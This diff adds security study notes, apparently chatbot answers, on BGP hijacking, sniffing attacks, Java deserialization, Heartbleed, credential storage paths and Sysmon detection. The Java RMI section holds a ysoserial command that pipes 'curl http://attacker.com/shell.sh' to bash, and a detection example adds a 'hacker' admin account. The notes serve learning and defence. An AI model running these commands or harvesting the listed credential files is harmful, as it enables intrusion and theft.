@@ -850,3 +850,492 @@ Passive reconnaissance involves gathering information about a target **without d
 ### **6. Threat Intelligence**  
 - **Monitor Pastebin/Dark Web**: Use services like [Have I Been Pwned](https://haveibeenpwned.com/) or [DarkOwl](https://www.darkowl.com/).  
 
+---
+
+### **Border Gateway Protocol (BGP) Hijacking Attack**  
+
+**BGP hijacking** is a cyberattack where malicious actors manipulate internet routing tables to redirect traffic through unauthorized networks. Since BGP (the protocol that routes traffic between autonomous systems (ASes) on the internet) relies on trust, attackers can exploit it to intercept, monitor, or disrupt data flows.
+
+---
+
+## **How BGP Hijacking Works**  
+1. **Announcing False Routes**  
+   - An attacker (or a compromised AS) falsely advertises ownership of IP prefixes they don’t actually control.  
+   - Example: Claiming to be the best path for `192.0.2.0/24` even though they don’t own it.  
+
+2. **Traffic Redirection**  
+   - Neighboring routers update their routing tables, believing the attacker’s AS is the shortest path.  
+   - Legitimate traffic gets rerouted through the attacker’s network.  
+
+3. **Exploitation**  
+   - **Interception** (Man-in-the-Middle attacks, snooping on unencrypted data).  
+   - **Denial-of-Service (DoS)** (Blackholing traffic by dropping it).  
+   - **Phishing/Spying** (Redirecting users to fake websites).  
+
+---
+
+## **Types of BGP Hijacking**  
+1. **Prefix Hijacking**  
+   - An AS announces someone else’s IP range (e.g., hijacking Google’s IP space).  
+
+2. **Subprefix Hijacking**  
+   - A more specific (smaller) route is advertised (e.g., `192.0.2.0/25` instead of `/24`), which takes priority.  
+
+3. **AS Path Hijacking**  
+   - Falsifying the AS path to make a route appear shorter and more desirable.  
+
+4. **Route Leaks (Accidental Hijacking)**  
+   - Misconfigured routers unintentionally propagate incorrect routes.  
+
+---
+
+## **Famous BGP Hijacking Attacks**  
+- **2018: Amazon Route 53 Hijack**  
+  - Attackers rerouted traffic meant for Amazon’s DNS service to steal cryptocurrency.  
+- **2020: Russian ISP Hijacks Major Internet Routes**  
+  - Rostelecom redirected traffic from Google, AWS, and others.  
+- **2022: Chinese ISP Hijacks Western Traffic**  
+  - China Telecom briefly rerouted European and U.S. internet traffic.  
+
+---
+
+## **How to Detect & Prevent BGP Hijacking**  
+### **Detection**  
+- **BGP Monitoring Tools** (e.g., BGPStream, RIPE Stat, Cloudflare Radar).  
+- **Route Origin Authorization (ROA)** checks (via RPKI).  
+- **Anomaly Detection** (sudden changes in AS paths).  
+
+### **Prevention**  
+1. **Resource Public Key Infrastructure (RPKI)**  
+   - Cryptographically validates route announcements.  
+2. **BGPsec** (BGP Security Extensions)  
+   - Digitally signs BGP updates to prevent tampering.  
+3. **Prefix Filtering**  
+   - ISPs should filter invalid route announcements.  
+4. **AS-SET & IRR Registrations**  
+   - Properly register IP ranges in routing databases.  
+
+---
+
+## **Conclusion**  
+BGP hijacking remains a critical threat due to BGP’s trust-based nature. While RPKI and BGPsec improve security, widespread adoption is still needed. Organizations should monitor BGP routes and implement filtering to reduce risks.  
+
+---
+
+
+Here’s a breakdown of **passive vs. active sniffing attacks**, along with details on **MAC Flooding, ARP Poisoning, SSL Stripping, and DNS Spoofing**:
+
+---
+
+## **1. Passive vs. Active Sniffing Attacks**
+| **Type**       | **Description**                                                                 | **Detection Difficulty** | **Examples**                          |
+|----------------|---------------------------------------------------------------------------------|--------------------------|---------------------------------------|
+| **Passive**    | Silent interception of traffic without altering packets.                        | Hard to detect           | Eavesdropping on unencrypted Wi-Fi.   |
+| **Active**     | Actively manipulates traffic (injects/modifies packets).                        | Easier to detect         | ARP Poisoning, DNS Spoofing.          |
+
+---
+
+## **2. MAC Flooding Attack (Active)**
+### **How It Works**  
+- Floods a switch’s **MAC address table** with fake MACs until it overflows.  
+- Forces the switch into **"hub mode"**, broadcasting traffic to all ports (enabling sniffing).  
+
+### **Impact**  
+- Allows attackers to capture all traffic passing through the switch.  
+
+### **Prevention**  
+- **Port Security** (limit MACs per port).  
+- **802.1X authentication**.  
+
+---
+
+## **3. ARP Poisoning (ARP Spoofing) (Active)**
+### **How It Works**  
+- Sends fake **ARP replies** to associate the attacker’s MAC with a legitimate IP (e.g., the router).  
+- Redirects traffic through the attacker’s machine (**Man-in-the-Middle attack**).  
+
+### **Impact**  
+- Intercept/modify traffic (e.g., steal passwords, inject malware).  
+
+### **Prevention**  
+- **Static ARP entries** (but hard to scale).  
+- **ARP monitoring tools** (e.g., Arpwatch).  
+- **Encryption (HTTPS, VPNs)**.  
+
+---
+
+## **4. SSL Stripping (Active)**
+### **How It Works**  
+- Downgrades **HTTPS → HTTP** by intercepting and modifying requests.  
+- Often combined with **ARP Poisoning or Evil Twin Wi-Fi attacks**.  
+
+### **Impact**  
+- Steals login credentials, session cookies.  
+
+### **Prevention**  
+- **HSTS (HTTP Strict Transport Security)**.  
+- **Always check for HTTPS** (padlock icon).  
+
+---
+
+## **5. DNS Spoofing (DNS Cache Poisoning) (Active)**
+### **How It Works**  
+- Corrupts a DNS resolver’s cache with fake entries (e.g., `google.com → attacker’s IP`).  
+- Victims are redirected to malicious sites.  
+
+### **Impact**  
+- Phishing, malware distribution.  
+
+### **Prevention**  
+- **DNSSEC (DNS Security Extensions)**.  
+- **Use trusted DNS resolvers** (e.g., Cloudflare, Google DNS).  
+
+---
+
+## **Comparison Table**
+| **Attack**         | **Layer**       | **Goal**                          | **Defense**                     |
+|--------------------|----------------|-----------------------------------|----------------------------------|
+| **MAC Flooding**   | Layer 2 (Data Link) | Disable switch security         | Port security, 802.1X           |
+| **ARP Poisoning**  | Layer 2/3      | MITM, traffic interception       | Static ARP, encryption          |
+| **SSL Stripping**  | Layer 7 (App)  | Downgrade HTTPS → HTTP           | HSTS, manual HTTPS verification |
+| **DNS Spoofing**   | Layer 7 (App)  | Redirect to fake sites           | DNSSEC, secure DNS resolvers    |
+
+---
+
+### **Key Takeaways**  
+- **Passive attacks** are stealthier (e.g., Wi-Fi sniffing).  
+- **Active attacks** (ARP Poisoning, DNS Spoofing) manipulate traffic.  
+- **Encryption (HTTPS, VPNs)** and **network hardening** (port security, DNSSEC) are critical defenses.  
+
+
+Here’s a detailed breakdown of each attack, including how they work, real-world examples, and mitigation strategies:
+
+---
+
+### **1. Buffer Overflow Attack**
+#### **What It Is**  
+A memory corruption attack where an attacker writes more data into a buffer than it can hold, overwriting adjacent memory and potentially executing malicious code.
+
+#### **How It Works**  
+- **Stack-based overflow**: Overflows a fixed-size stack buffer, overwriting the return address to hijack execution.  
+- **Heap-based overflow**: Corrupts dynamic memory structures to manipulate program behavior.  
+- **Example**: The **Code Red worm (2001)** exploited a buffer overflow in IIS.  
+
+#### **Exploitation Steps**  
+1. Find a vulnerable function (e.g., `strcpy`, `gets`).  
+2. Craft input to overwrite EIP (Instruction Pointer).  
+3. Redirect execution to shellcode (e.g., `/bin/sh`).  
+
+#### **Mitigation**  
+- **Stack Canaries**: Detect stack corruption (e.g., `-fstack-protector` in GCC).  
+- **DEP (Data Execution Prevention)**: Blocks code execution in non-executable memory.  
+- **ASLR (Address Space Layout Randomization)**: Randomizes memory addresses.  
+
+---
+
+### **2. NetNTLM Hash Attack (Pass-the-Hash)**
+#### **What It Is**  
+An attack exploiting Windows’ NTLM authentication protocol to steal password hashes and impersonate users without cracking them.
+
+#### **How It Works**  
+- **Step 1**: Extract hashes from memory (e.g., Mimikatz) or SMB logs.  
+- **Step 2**: Relay the hash to another machine (e.g., via **Responder** or **Impacket’s smbrelayx**).  
+- **Example**: Lateral movement in Active Directory.  
+
+#### **Mitigation**  
+- **Enable SMB Signing**: Prevents relay attacks.  
+- **Use Kerberos**: Prefers AES over NTLM.  
+- **Restrict NTLM**: Via Group Policy (`Network security: Restrict NTLM`).  
+
+---
+
+### **3. Heartbleed (CVE-2014-0160)**
+#### **What It Is**  
+A vulnerability in OpenSSL’s TLS/DTLS heartbeat extension that leaks server memory (up to 64KB per request).
+
+#### **How It Works**  
+- **Malicious Heartbeat Request**: Sends a fake payload length (e.g., `65535`) to trick the server into returning private data.  
+- **Leaked Data**: Private keys, session cookies, passwords.  
+
+#### **Exploitation**  
+```bash
+openssl s_client -connect vuln-site:443 -tlsextdebug 2>&1 | grep "server extension"
+```  
+**Tool**: `Metasploit (auxiliary/scanner/ssl/openssl_heartbleed)`.  
+
+#### **Mitigation**  
+- **Patch OpenSSL** (v1.0.1g or later).  
+- **Revoke compromised certificates**.  
+
+---
+
+### **4. Java RMI Registry Exploitation**
+#### **What It Is**  
+Abuse of Java Remote Method Invocation (RMI) to execute arbitrary code on misconfigured servers.
+
+#### **How It Works**  
+- **Step 1**: Find exposed RMI ports (default: `1099`).  
+- **Step 2**: Exploit deserialization flaws (e.g., **ysoserial** with gadgets like `CommonsCollections`).  
+- **Example**: **Apache JMX RMI exploits**.  
+
+#### **Exploitation**  
+```bash
+java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit target 1099 CommonsCollections5 "curl http://attacker.com/shell.sh | bash"
+```  
+
+#### **Mitigation**  
+- **Disable RMI registry** if unused.  
+- **Use JMX authentication**.  
+- **Patch deserialization libraries**.  
+
+---
+
+### **5. DNS Amplification Attack (DDoS)**
+#### **What It Is**  
+A reflection-based DDoS attack using open DNS resolvers to flood a victim with large responses.
+
+#### **How It Works**  
+- **Step 1**: Spoof the victim’s IP as the source.  
+- **Step 2**: Send small queries (e.g., `ANY` requests) to DNS resolvers.  
+- **Amplification**: Responses are **50–100x larger** than requests.  
+
+#### **Example**  
+```plaintext
+Attacker (1KB query) → Open DNS Resolver (50KB response) → Victim
+```  
+
+#### **Mitigation**  
+- **Rate-limit DNS responses** (e.g., `iptables`).  
+- **Disable open recursion** on DNS servers.  
+- **Use BCP38** (anti-spoofing filters).  
+
+---
+
+### **6. Insecure Java Deserialization**
+#### **What It Is**  
+Exploiting unsafe deserialization of objects in Java apps to execute arbitrary code.
+
+#### **How It Works**  
+- **Step 1**: Find a deserialization endpoint (e.g., HTTP, RMI).  
+- **Step 2**: Craft a malicious serialized object (e.g., using **ysoserial**).  
+- **Gadget Chains**: Leverage libraries like `CommonsCollections`, `Groovy`, or `Jackson`.  
+
+#### **Exploitation**  
+```bash
+java -jar ysoserial.jar CommonsCollections5 "id" > payload.bin
+curl --data-binary @payload.bin http://vuln-app/deserialize
+```  
+
+#### **Mitigation**  
+- **Use `ObjectInputFilter` (Java 9+)**.  
+- **Replace Java serialization** with JSON/Protobuf.  
+- **Patch libraries** (e.g., Apache Commons).  
+
+---
+
+### **Summary Table**
+| **Attack**                     | **Target**          | **Key Tool**          | **Defense**                          |
+|--------------------------------|---------------------|-----------------------|--------------------------------------|
+| **Buffer Overflow**            | C/C++ apps          | GDB, Metasploit       | DEP/ASLR, bounds checking            |
+| **NetNTLM Hash Attack**        | Windows AD          | Mimikatz, Responder   | SMB Signing, Kerberos                |
+| **Heartbleed**                 | OpenSSL servers     | Metasploit, OpenSSL   | Patch OpenSSL                        |
+| **Java RMI Exploit**           | Java RMI services   | ysoserial             | Disable RMI, JMX auth                |
+| **DNS Amplification**          | DNS resolvers       | hping3, Scapy         | Rate limiting, BCP38                 |
+| **Java Deserialization**       | Java web apps       | ysoserial, Burp Suite | `ObjectInputFilter`, JSON migration  |
+
+---
+
+### **Final Notes**  
+- **Buffer overflows** and **deserialization** are code-level flaws.  
+- **NetNTLM** and **Heartbleed** exploit protocol weaknesses.  
+- **DNS amplification** is a network-layer DDoS tactic.  
+
+Would you like a hands-on lab for any of these attacks?
+
+
+---
+
+files location where store credentials
+
+These files are part of **Windows unattended installation** or **sysprep** configurations, often used for automated OS deployments. They may contain **credentials, product keys, or other sensitive information** if not properly cleaned after setup.  
+
+### **Common Unattended/Sysprep Files & Risks**  
+1. **`C:\sysprep\sysprep.xml`**  
+   - Part of the **System Preparation Tool (sysprep)**.  
+   - May store local admin credentials or domain join details.  
+
+2. **`C:\sysprep\sysprep.inf`**  
+   - Older configuration file (replaced by `.xml` in newer Windows versions).  
+   - Can contain plaintext passwords if `AutoLogon` or `DomainJoin` settings are enabled.  
+
+3. **`C:\sysprep.inf`**  
+   - Alternate location for sysprep configuration (used in legacy setups).  
+
+4. **`C:\unattend.xml`**  
+   - **Unattended Windows Setup** file for automated installations.  
+   - May include:  
+     - Local user account passwords (sometimes base64-encoded).  
+     - Domain-join credentials (`<DomainJoinData>`).  
+     - Product keys (`<ProductKey>`).  
+
+5. **`C:\Windows\Panther\Unattend.xml`**  
+   - Default location for unattend files during Windows installation.  
+
+6. **`C:\Windows\Panther\Unattend\Unattend.xml`**  
+   - Alternate path used in some deployment scenarios.  
+
+### **Why Are They Dangerous?**  
+- **Credentials may be stored in plaintext or weakly encrypted** (e.g., base64).  
+- Attackers use tools like **Metasploit (`post/windows/gather/enum_unattend`)** or manually search for these files.  
+- Sysadmins often forget to delete them after deployment.  
+
+The location where credentials are stored depends on the operating system and the type of credentials (e.g., system logins, application passwords, browser-stored credentials). Below are common locations for credential storage:
+
+### **Windows**
+
+1. **SAM (Security Account Manager) Database**
+    
+    - Location: `%SystemRoot%\system32\config\SAM`
+        
+    - Stores local user account credentials (hashed).
+        
+    - Requires SYSTEM privileges to access.
+        
+2. **LSASS (Local Security Authority Subsystem Service) Memory**
+    
+    - Stores logged-in users' credentials in memory.
+        
+    - Can be dumped using tools like Mimikatz.
+        
+3. **Credential Manager (Windows Vault)**
+    
+    - GUI: `Control Panel > User Accounts > Credential Manager`
+        
+    - Files:
+        
+        - `%AppData%\Microsoft\Credentials\`
+            
+        - `%LocalAppData%\Microsoft\Vault\`
+            
+4. **DPAPI (Data Protection API) Encrypted Files**
+    
+    - Used by browsers & apps to store passwords.
+        
+    - Locations:
+        
+        - Chrome: `%LocalAppData%\Google\Chrome\User Data\Default\Login Data`
+            
+        - Edge: `%LocalAppData%\Microsoft\Edge\User Data\Default\Login Data`
+            
+        - Other apps: `%AppData%\Microsoft\Protect\<SID>\`
+            
+5. **Cached Domain Credentials**
+    
+    - Location: `HKLM\SECURITY\Cache` (Registry)
+        
+    - Stores domain credentials when a domain-joined machine is offline.
+        
+6. **LSA Secrets (Registry)**
+    
+    - Location: `HKLM\SECURITY\Policy\Secrets\`
+        
+    - Stores service account passwords and other secrets.
+        
+
+---
+
+### **Linux / Unix-like Systems**
+
+1. **/etc/passwd & /etc/shadow**
+    
+    - `/etc/passwd` → User account info (no passwords in modern systems).
+        
+    - `/etc/shadow` → Hashed passwords (requires root access).
+        
+2. **~/.bash_history, ~/.zsh_history**
+    
+    - May contain plaintext passwords if accidentally entered in commands.
+        
+3. **SSH Keys**
+    
+    - `~/.ssh/id_rsa`, `~/.ssh/id_rsa.pub` (Private & Public keys).
+        
+    - `~/.ssh/known_hosts` (Stores trusted hosts).
+        
+4. **GNOME Keyring / KWallet**
+    
+    - `~/.local/share/keyrings/` (GNOME)
+        
+    - `~/.kde/share/apps/kwallet/` (KDE)
+        
+5. **Application-Specific Storage**
+    
+    - Firefox: `~/.mozilla/firefox/<profile>/logins.json` (encrypted)
+        
+    - Chrome/Chromium: `~/.config/google-chrome/Default/Login Data`
+        
+    - MySQL: `~/.my.cnf` (may contain credentials)
+---
+
+**Sysmon Event ID 1: Process Creation** is a critical log entry for **SOC analysts** as it records the creation of new processes on a Windows system. This event helps detect malicious activities like malware execution, lateral movement, and suspicious process behavior.
+
+### **Key Fields in Event ID 1 (Process Creation)**
+| Field | Description | SOC Analyst Relevance |
+|--------|-------------|----------------------|
+| **UtcTime** | Timestamp (UTC) | Timeline analysis |
+| **ProcessGuid** | Unique process identifier | Tracking process lineage |
+| **ProcessId** | Process ID (PID) | Cross-referencing with other logs |
+| **Image** | Executable path (e.g., `C:\Windows\System32\cmd.exe`) | Detect unusual locations (e.g., `Temp`, `AppData`) |
+| **CommandLine** | Full command used to launch the process | Detect obfuscation, suspicious arguments |
+| **User** | User account executing the process | Privilege escalation detection |
+| **ParentProcessGuid** | Parent process GUID | Identify process injection/spawning |
+| **ParentImage** | Parent process executable (e.g., `explorer.exe`) | Detect living-off-the-land binaries (LOLBins) |
+| **ParentCommandLine** | Command line of the parent process | Unusual parent-child relationships |
+
+### **Why SOC Analysts Care About Event ID 1**
+1. **Malware Detection**  
+   - Unknown/unsigned executables running from `%AppData%`, `Temp`, or unusual directories.
+   - Processes with random or misspelled names (`svch0st.exe` instead of `svchost.exe`).
+
+2. **Lateral Movement & Persistence**  
+   - `PsExec`, `WMI`, or `schtasks` spawning suspicious child processes.
+   - Scheduled tasks or services launching malicious payloads.
+
+3. **Command-Line Obfuscation**  
+   - Base64-encoded commands (`powershell -enc SQBFAFgA...`).
+   - Long, obfuscated PowerShell scripts.
+
+4. **Living-Off-The-Land (LOLBins)**  
+   - Legitimate tools (`msbuild.exe`, `regsvr32.exe`) executing malicious scripts.
+
+5. **Parent-Process Anomalies**  
+   - `explorer.exe` spawning `cmd.exe` (normal) vs. `word.exe` spawning `powershell.exe` (suspicious).
+
+### **Example Detection Scenarios**
+✅ **Suspicious Process from Temp Directory**  
+```json
+"Image": "C:\\Users\\Public\\Temp\\malware.exe"
+```
+✅ **PowerShell with Encoded Command**  
+```json
+"CommandLine": "powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA=="
+```
+✅ **Unusual Parent-Child Relationship**  
+```json
+"ParentImage": "C:\\Windows\\System32\\msiexec.exe",
+"Image": "C:\\Windows\\System32\\cmd.exe /c net user hacker P@ssw0rd /add"
+```
+
+### **How to Use in Investigations**
+- **SIEM Correlation**: Combine with **Event ID 3 (Network Connection)** to track C2 communications.
+- **Hunting**: Look for processes spawned by **Office apps, PDF readers, or browsers** (common exploit vectors).
+- **Baselining**: Compare against known-good process trees.
+
+### **Mitre ATT&CK Mapping**
+- **T1059** (Command-Line Interface)  
+- **T1053** (Scheduled Task Execution)  
+- **T1106** (Execution via API)  
+
+**Conclusion:** Event ID 1 is a goldmine for detecting malicious activity. SOC analysts should **filter for anomalies** in `Image`, `CommandLine`, and `ParentProcess` fields to uncover threats.
+
+Would you like a sample query (Splunk, KQL, Sigma) for hunting? 🚠️
